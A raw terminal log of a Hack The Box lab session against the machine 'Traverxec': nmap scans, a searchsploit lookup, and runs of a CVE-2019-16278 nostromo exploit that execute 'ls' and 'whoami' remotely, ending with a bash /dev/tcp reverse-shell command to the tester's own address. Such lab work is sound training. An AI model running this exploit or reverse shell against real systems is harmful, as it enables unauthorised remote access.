root@parrot:~/hackthebox/traverxec# mkdir nmap                                   
root@parrot:~/hackthebox/traverxec# nmap -sC -sV -oA nmap/traverxec              
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 09:44 EST                  
WARNING: No targets were specified, so 0 hosts scanned.                          
Nmap done: 0 IP addresses (0 hosts up) scanned in 2.90 seconds                   
root@parrot:~/hackthebox/traverxec# nmap -sC -sV -oA nmap/traverxec 10.10.10.165 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 09:45 EST                  
Nmap scan report for 10.10.10.165       
Host is up (0.22s latency).             
Not shown: 998 filtered ports           
PORT   STATE SERVICE VERSION            
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)              
| ssh-hostkey:                          
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)                   
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)                  
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)                
80/tcp open  http    nostromo 1.9.6     
|_http-server-header: nostromo 1.9.6    
|_http-title: TRAVERXEC                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                          

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                    
Nmap done: 1 IP address (1 host up) scanned in 35.42 seconds                     
root@parrot:~/hackthebox/traverxec# nmap -vvv -p- -oA nmap/fullport 10.10.10.160 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 10:07 EST                  
Initiating Ping Scan at 10:07           
Scanning 10.10.10.160 [4 ports]         

root@parrot:~/hackthebox/traverxec# nmap -vvv -p- -oA nmap/fullport 10.10.10.165 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 10:08 EST                  
Initiating Ping Scan at 10:08           
Scanning 10.10.10.165 [4 ports]         
Completed Ping Scan at 10:08, 0.22s elapsed (1 total hosts)                      
Initiating Parallel DNS resolution of 1 host. at 10:08                           
Completed Parallel DNS resolution of 1 host. at 10:08, 0.00s elapsed             
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]                                                                  
Initiating SYN Stealth Scan at 10:08    
Scanning 10.10.10.165 [65535 ports]     
Discovered open port 80/tcp on 10.10.10.165                                      
Discovered open port 22/tcp on 10.10.10.165                                      
SYN Stealth Scan Timing: About 1.27% done; ETC: 10:48 (0:40:11 remaining)        
SYN Stealth Scan Timing: About 2.11% done; ETC: 10:56 (0:47:03 remaining)        
SYN Stealth Scan Timing: About 3.40% done; ETC: 10:52 (0:43:04 remaining)        
SYN Stealth Scan Timing: About 6.24% done; ETC: 10:40 (0:30:33 remaining)        
SYN Stealth Scan Timing: About 7.19% done; ETC: 10:43 (0:32:41 remaining)        
SYN Stealth Scan Timing: About 9.62% done; ETC: 10:42 (0:30:50 remaining)        
SYN Stealth Scan Timing: About 14.74% done; ETC: 10:42 (0:29:01 remaining)       
SYN Stealth Scan Timing: About 17.76% done; ETC: 10:39 (0:25:33 remaining)       
SYN Stealth Scan Timing: About 20.58% done; ETC: 10:37 (0:23:13 remaining)       
SYN Stealth Scan Timing: About 24.32% done; ETC: 10:34 (0:20:17 remaining)       
SYN Stealth Scan Timing: About 32.93% done; ETC: 10:36 (0:18:56 remaining)       
SYN Stealth Scan Timing: About 42.31% done; ETC: 10:38 (0:17:28 remaining)       
SYN Stealth Scan Timing: About 46.70% done; ETC: 10:36 (0:15:12 remaining)       
SYN Stealth Scan Timing: About 52.48% done; ETC: 10:34 (0:12:31 remaining)       
SYN Stealth Scan Timing: About 57.96% done; ETC: 10:32 (0:10:23 remaining)       
SYN Stealth Scan Timing: About 62.39% done; ETC: 10:32 (0:09:03 remaining)       
SYN Stealth Scan Timing: About 66.91% done; ETC: 10:31 (0:07:46 remaining)       
SYN Stealth Scan Timing: About 71.84% done; ETC: 10:31 (0:06:28 remaining)       
SYN Stealth Scan Timing: About 76.80% done; ETC: 10:30 (0:05:11 remaining)       
SYN Stealth Scan Timing: About 81.52% done; ETC: 10:29 (0:04:00 remaining)       
SYN Stealth Scan Timing: About 86.33% done; ETC: 10:29 (0:02:55 remaining)       
SYN Stealth Scan Timing: About 91.39% done; ETC: 10:29 (0:01:51 remaining)       
SYN Stealth Scan Timing: About 96.65% done; ETC: 10:29 (0:00:43 remaining)       
Completed SYN Stealth Scan at 10:29, 1308.36s elapsed (65535 total ports)        
Nmap scan report for 10.10.10.165       
Host is up, received echo-reply ttl 63 (0.28s latency).                          
Scanned at 2020-01-13 10:08:03 EST for 1308s                                     
Not shown: 65533 filtered ports         
Reason: 65533 no-responses              
PORT   STATE SERVICE REASON             
22/tcp open  ssh     syn-ack ttl 63     
80/tcp open  http    syn-ack ttl 63     

Read data files from: /usr/bin/../share/nmap                                     
Nmap done: 1 IP address (1 host up) scanned in 1308.86 seconds                   
           Raw packets sent: 131809 (5.800MB) | Rcvd: 842 (37.032KB)             
root@parrot:~/hackthebox/traverxec# nmap -sU -sC -sV -oA nmap/traverxec 10.10.10.165                                                                              
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 10:46 EST                  

root@parrot:~/hackthebox/traverxec# nmap -sU -sC -sV -oA nmap/udp 10.10.10.165                                                                                    
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 10:48 EST                  

root@parrot:~/hackthebox/traverxec# less nmap/traverxec.nmap                     
root@parrot:~/hackthebox/traverxec# searchsploit nostromo                        
------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                           |  Path                                  
                                                                                                                         | (/usr/share/exploitdb/)                
------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                                                     | exploits/multiple/remote/47573.rb      
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                     | exploits/linux/remote/35466.sh         
------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result                   
root@parrot:~/hackthebox/traverxec# vi expploit.py                               
root@parrot:~/hackthebox/traverxec# mv expploit.py exploit.py                    
root@parrot:~/hackthebox/traverxec# python exploit.py                            
Traceback (most recent call last):      
  File "exploit.py", line 10, in <module>                                        
    cve2019_16278.py                    
NameError: name 'cve2019_16278' is not defined                                   
root@parrot:~/hackthebox/traverxec# vi exploit.py                                
root@parrot:~/hackthebox/traverxec# python exploit.py                            


                                        _____-2019-16278                         
        _____  _______    ______   _____\    \                                   
   _____\    \_\      |  |      | /    / |    |                                  
  /     /|     ||     /  /     /|/    /  /___/|                                  
 /     / /____/||\    \  \    |/|    |__ |___|/                                  
|     | |____|/ \ \    \ |    | |       \                                        
|     |  _____   \|     \|    | |     __/ __                                     
|\     \|\    \   |\         /| |\    \  /  \                                    
| \_____\|    |   | \_______/ | | \____\/    |                                   
| |     /____/|    \ |     | /  | |    |____/|                                   
 \|_____|    ||     \|_____|/    \|____|   | |                                   
        |____|/                        |___|/                                    





Usage: cve2019-16278.py <Target_IP> <Target_Port> <Command>                      
root@parrot:~/hackthebox/traverxec# python exploit.py 10.10.10.165 80 ls         


                                        _____-2019-16278                         
        _____  _______    ______   _____\    \                                   
   _____\    \_\      |  |      | /    / |    |                                  
  /     /|     ||     /  /     /|/    /  /___/|                                  
 /     / /____/||\    \  \    |/|    |__ |___|/                                  
|     | |____|/ \ \    \ |    | |       \                                        
|     |  _____   \|     \|    | |     __/ __                                     
|\     \|\    \   |\         /| |\    \  /  \                                    
| \_____\|    |   | \_______/ | | \____\/    |                                   
| |     /____/|    \ |     | /  | |    |____/|                                   
 \|_____|    ||     \|_____|/    \|____|   | |                                   
        |____|/                        |___|/                                    




HTTP/1.1 200 OK                         
Date: Mon, 13 Jan 2020 18:49:06 GMT     
Server: nostromo 1.9.6                  
Connection: close                       


2to3-2.7                                
[                                       
aa-enabled                              
aa-exec                                 
addpart                                 
apropos                                 
apt                                     
apt-cache                               
apt-cdrom                               
apt-config                              
apt-extracttemplates                    
apt-ftparchive                          
apt-get                                 
apt-key                                 
apt-listchanges                         
apt-mark                                
apt-sortpkgs                            
arch                                    
awk                                     
b2sum                                   
base32                                  
base64                                  
basename                                
bash                                    
bashbug                                 
bootctl                                 
bsd-from                                
bsd-write                               
buildhash                               
bunzip2                                 
busctl                                  
busybox                                 
bzcat                                   
bzcmp                                   
bzdiff                                  
bzegrep                                 
bzexe                                   
bzfgrep                                 
bzgrep                                  
bzip2                                   
bzip2recover                            
bzless                                  
bzmore                                  
c_rehash                                
cal                                     
calendar                                
captoinfo                               
cat                                     
catchsegv                               
catman                                  
chage                                   
chardet3                                
chardetect3                             
chattr                                  
chcon                                   
chfn                                    
chgrp                                   
chmod                                   
choom                                   
chown                                   
chrt                                    
chsh                                    
chvt                                    
ckbcomp                                 
cksum                                   
clear                                   
clear_console                           
cmp                                     
codepage                                
col                                     
colcrt                                  
colrm                                   
column                                  
comm                                    
compose                                 
corelist                                
cp                                      
cpan                                    
cpan5.28-x86_64-linux-gnu               
cpio                                    
crontab                                 
csplit                                  
ctstat                                  
cut                                     
cvtsudoers                              
dash                                    
date                                    
dbus-cleanup-sockets                    
dbus-daemon                             
dbus-monitor                            
dbus-run-session                        
dbus-send                               
dbus-update-activation-environment      
dbus-uuidgen                            
dd                                      
deallocvt                               
deb-systemd-helper                      
deb-systemd-invoke                      
debconf                                 
debconf-apt-progress                    
debconf-communicate                     
debconf-copydb                          
debconf-escape                          
debconf-set-selections                  
debconf-show                            
debianbts                               
defmt-c                                 
defmt-sh                                
delpart                                 
df                                      
dh_bash-completion                      
dh_python2                              
diff                                    
diff3                                   
dir                                     
dircolors                               
dirname                                 
discover-config                         
dmesg                                   
dnsdomainname                           
domainname                              
dos2unix                                
dotlockfile                             
dpkg                                    
dpkg-deb                                
dpkg-divert                             
dpkg-maintscript-helper                 
dpkg-query                              
dpkg-split                              
dpkg-statoverride                       
dpkg-trigger                            
du                                      
dumpkeys                                
echo                                    
edit                                    
editor                                  
egrep                                   
eject                                   
enc2xs                                  
encguess                                
env                                     
envsubst                                
eqn                                     
ex                                      
expand                                  
expiry                                  
expr                                    
factor                                  
faillog                                 
fallocate                               
false                                   
fgconsole                               
fgrep                                   
file                                    
fincore                                 
find                                    
findaffix                               
findmnt                                 
flock                                   
fmt                                     
fold                                    
free                                    
from                                    
funzip                                  
geqn                                    
getconf                                 
getent                                  
getkeycodes                             
getopt                                  
gettext                                 
gettext.sh                              
gpasswd                                 
gpgv                                    
gpic                                    
grep                                    
groff                                   
grog                                    
grops                                   
grotty                                  
groups                                  
grub-editenv                            
grub-file                               
grub-fstest                             
grub-glue-efi                           
grub-kbdcomp                            
grub-menulst2cfg                        
grub-mkfont                             
grub-mkimage                            
grub-mklayout                           
grub-mknetdir                           
grub-mkpasswd-pbkdf2                    
grub-mkrelpath                          
grub-mkrescue                           
grub-mkstandalone                       
grub-mount                              
grub-ntldr-img                          
grub-render-label                       
grub-script-check                       
grub-syslinux2cfg                       
gtbl                                    
gunzip                                  
gzexe                                   
gzip                                    
h2ph                                    
h2xs                                    
hd                                      
head                                    
helpztags                               
hexdump                                 
host                                    
hostid                                  
hostname                                
hostnamectl                             
i386                                    
icombine                                
iconv                                   
id                                      
ijoin                                   
infocmp                                 
infotocap                               
install                                 
instmodsh                               
ionice                                  
ip                                      
ipcmk                                   
ipcrm                                   
ipcs                                    
iptables-xml                            
ischroot                                
ispell                                  
ispell-wrapper                          
join                                    
journalctl                              
json_pp                                 
kbd_mode                                
kbdinfo                                 
kernel-install                          
kill                                    
kmod                                    
laptop-detect                           
last                                    
lastb                                   
lastlog                                 
lcf                                     
ldd                                     
less                                    
lessecho                                
lessfile                                
lesskey                                 
lesspipe                                
lexgrog                                 
lft                                     
lft.db                                  
libnetcfg                               
link                                    
linux-boot-prober                       
linux-check-removal                     
linux-update-symlinks                   
linux-version                           
linux32                                 
linux64                                 
ln                                      
lnstat                                  
loadkeys                                
loadunimap                              
locale                                  
localectl                               
localedef                               
logger                                  
login                                   
loginctl                                
logname                                 
look                                    
lorder                                  
ls                                      
lsattr                                  
lsb_release                             
lsblk                                   
lscpu                                   
lsinitramfs                             
lsipc                                   
lslocks                                 
lslogins                                
lsmem                                   
lsmod                                   
lsns                                    
lsof                                    
lspci                                   
lzcat                                   
lzcmp                                   
lzdiff                                  
lzegrep                                 
lzfgrep                                 
lzgrep                                  
lzless                                  
lzma                                    
lzmainfo                                
lzmore                                  
mac2unix                                
man                                     
mandb                                   
manpath                                 
mapscrn                                 
mawk                                    
mcookie                                 
md5sum                                  
md5sum.textutils                        
mesg                                    
mk_modmap                               
mkdir                                   
mkfifo                                  
mknod                                   
mktemp                                  
more                                    
mount                                   
mountpoint                              
mt                                      
mt-gnu                                  
munchlist                               
mv                                      
namei                                   
nano                                    
nawk                                    
nc                                      
nc.traditional                          
ncal                                    
neqn                                    
netcat                                  
networkctl                              
newgrp                                  
ngettext                                
nice                                    
nisdomainname                           
nl                                      
nohup                                   
nproc                                   
nroff                                   
nsenter                                 
nstat                                   
numfmt                                  
od                                      
on_ac_power                             
openssl                                 
openvt                                  
os-prober                               
pager                                   
partx                                   
passwd                                  
paste                                   
pathchk                                 
pcimodules                              
pdb                                     
pdb2                                    
pdb2.7                                  
pdb3                                    
pdb3.7                                  
perf                                    
perl                                    
perl5.28-x86_64-linux-gnu               
perl5.28.1                              
perlbug                                 
perldoc                                 
perlivp                                 
perlthanks                              
pgrep                                   
pic                                     
pico                                    
piconv                                  
pidof                                   
ping                                    
ping4                                   
ping6                                   
pinky                                   
pkill                                   
pl2pm                                   
pldd                                    
pmap                                    
pod2html                                
pod2man                                 
pod2text                                
pod2usage                               
podchecker                              
podselect                               
pr                                      
preconv                                 
print                                   
printenv                                
printerbanner                           
printf                                  
prlimit                                 
prove                                   
ps                                      
psfaddtable                             
psfgettable                             
psfstriptable                           
psfxtable                               
ptar                                    
ptardiff                                
ptargrep                                
ptx                                     
pwd                                     
pwdx                                    
py3clean                                
py3compile                              
py3versions                             
pyclean                                 
pycompile                               
pydoc                                   
pydoc2                                  
pydoc2.7                                
pydoc3                                  
pydoc3.7                                
pygettext                               
pygettext2                              
pygettext2.7                            
pygettext3                              
pygettext3.7                            
python                                  
python2                                 
python2.7                               
python3                                 
python3.7                               
python3.7m                              
python3m                                
pyversions                              
querybts                                
rbash                                   
rcp                                     
rdma                                    
readlink                                
realpath                                
rename.ul                               
renice                                  
report-hw                               
reportbug                               
reset                                   
resizecons                              
resizepart                              
resolvectl                              
rev                                     
rgrep                                   
rlogin                                  
rm                                      
rmdir                                   
rnano                                   
routef                                  
routel                                  
rsh                                     
rtstat                                  
run-mailcap                             
run-parts                               
runcon                                  
rview                                   
savelog                                 
scp                                     
screendump                              
script                                  
scriptreplay                            
sdiff                                   
sed                                     
see                                     
select-default-iwrap                    
select-editor                           
sensible-browser                        
sensible-editor                         
sensible-pager                          
seq                                     
setarch                                 
setfont                                 
setkeycodes                             
setleds                                 
setlogcons                              
setmetamode                             
setpci                                  
setpriv                                 
setsid                                  
setterm                                 
setupcon                                
setvtrgb                                
sftp                                    
sg                                      
sh                                      
sha1sum                                 
sha224sum                               
sha256sum                               
sha384sum                               
sha512sum                               
shasum                                  
showconsolefont                         
showkey                                 
shred                                   
shuf                                    
skill                                   
slabtop                                 
sleep                                   
slogin                                  
snice                                   
soelim                                  
sort                                    
splain                                  
split                                   
splitfont                               
sq                                      
ss                                      
ssh                                     
ssh-add                                 
ssh-agent                               
ssh-argv0                               
ssh-copy-id                             
ssh-keygen                              
ssh-keyscan                             
stat                                    
stdbuf                                  
stty                                    
su                                      
sudo                                    
sudoedit                                
sudoreplay                              
sum                                     
sync                                    
systemctl                               
systemd                                 
systemd-analyze                         
systemd-ask-password                    
systemd-cat                             
systemd-cgls                            
systemd-cgtop                           
systemd-delta                           
systemd-detect-virt                     
systemd-escape                          
systemd-hwdb                            
systemd-id128                           
systemd-inhibit                         
systemd-machine-id-setup                
systemd-mount                           
systemd-notify                          
systemd-path                            
systemd-resolve                         
systemd-run                             
systemd-socket-activate                 
systemd-stdio-bridge                    
systemd-sysusers                        
systemd-tmpfiles                        
systemd-tty-ask-password-agent          
systemd-umount                          
tabs                                    
tac                                     
tail                                    
tar                                     
tasksel                                 
taskset                                 
tbl                                     
tee                                     
telnet                                  
telnet.netkit                           
tempfile                                
test                                    
tic                                     
timedatectl                             
timeout                                 
tload                                   
toe                                     
top                                     
touch                                   
tput                                    
tr                                      
traceproto                              
traceproto.db                           
traceroute                              
traceroute-nanog                        
traceroute.db                           
traceroute6                             
traceroute6.db                          
troff                                   
true                                    
truncate                                
tryaffix                                
tset                                    
tsort                                   
tty                                     
tzselect                                
ucf                                     
ucfq                                    
ucfr                                    
udevadm                                 
ul                                      
umount                                  
uname                                   
uncompress                              
unexpand                                
unicode_start                           
unicode_stop                            
uniq                                    
unix2dos                                
unix2mac                                
unlink                                  
unlzma                                  
unmkinitramfs                           
unshare                                 
unsq                                    
unxz                                    
unzip                                   
unzipsfx                                
update-alternatives                     
uptime                                  
users                                   
utmpdump                                
vdir                                    
vi                                      
view                                    
vim.tiny                                
vm-support                              
vmhgfs-fuse                             
vmstat                                  
vmware-config-tools.pl                  
vmware-guestproxycerttool               
vmware-hgfsclient                       
vmware-toolbox-cmd                      
vmware-uninstall-tools.pl               
vmware-user                             
vmware-xferlogs                         
volname                                 
w                                       
w.procps                                
wall                                    
watch                                   
wc                                      
wdctl                                   
wget                                    
whatis                                  
whereis                                 
which                                   
whiptail                                
who                                     
whoami                                  
write                                   
x86_64                                  
xargs                                   
xauth                                   
xsubpp                                  
xxd                                     
xz                                      
xzcat                                   
xzcmp                                   
xzdiff                                  
xzegrep                                 
xzfgrep                                 
xzgrep                                  
xzless                                  
xzmore                                  
yes                                     
ypdomainname                            
zcat                                    
zcmp                                    
zdiff                                   
zdump                                   
zegrep                                  
zfgrep                                  
zforce                                  
zgrep                                   
zipdetails                              
zipgrep                                 
zipinfo                                 
zless                                   
zmore                                   
znew                                    

root@parrot:~/hackthebox/traverxec# python exploit.py 10.10.10.165 80 whoami     


                                        _____-2019-16278                         
        _____  _______    ______   _____\    \                                   
   _____\    \_\      |  |      | /    / |    |                                  
  /     /|     ||     /  /     /|/    /  /___/|                                  
 /     / /____/||\    \  \    |/|    |__ |___|/                                  
|     | |____|/ \ \    \ |    | |       \                                        
|     |  _____   \|     \|    | |     __/ __                                     
|\     \|\    \   |\         /| |\    \  /  \                                    
| \_____\|    |   | \_______/ | | \____\/    |                                   
| |     /____/|    \ |     | /  | |    |____/|                                   
 \|_____|    ||     \|_____|/    \|____|   | |                                   
        |____|/                        |___|/                                    




HTTP/1.1 200 OK                         
Date: Mon, 13 Jan 2020 18:49:23 GMT     
Server: nostromo 1.9.6                  
Connection: close                       


www-data                                

root@parrot:~/hackthebox/traverxec# python exploit.py 10.10.10.165 80 "bash -i >& /dev/tcp/10.10.14.14/7777 0>&1"                                                 


                                        _____-2019-16278                         
        _____  _______    ______   _____\    \                                   
   _____\    \_\      |  |      | /    / |    |                                  
  /     /|     ||     /  /     /|/    /  /___/|                                  
 /     / /____/||\    \  \    |/|    |__ |___|/                                  
|     | |____|/ \ \    \ |    | |       \                                        
|     |  _____   \|     \|    | |     __/ __                                     
|\     \|\    \   |\         /| |\    \  /  \                                    
| \_____\|    |   | \_______/ | | \____\/    |                                   
| |     /____/|    \ |     | /  | |    |____/|                                   
 \|_____|    ||     \|_____|/    \|____|   | |                                   
        |____|/                        |___|/                                    




HTTP/1.1 200 OK                         
Date: Mon, 13 Jan 2020 18:52:08 GMT     
Server: nostromo 1.9.6                  
Connection: close                       



root@parrot:~/hackthebox/traverxec#     
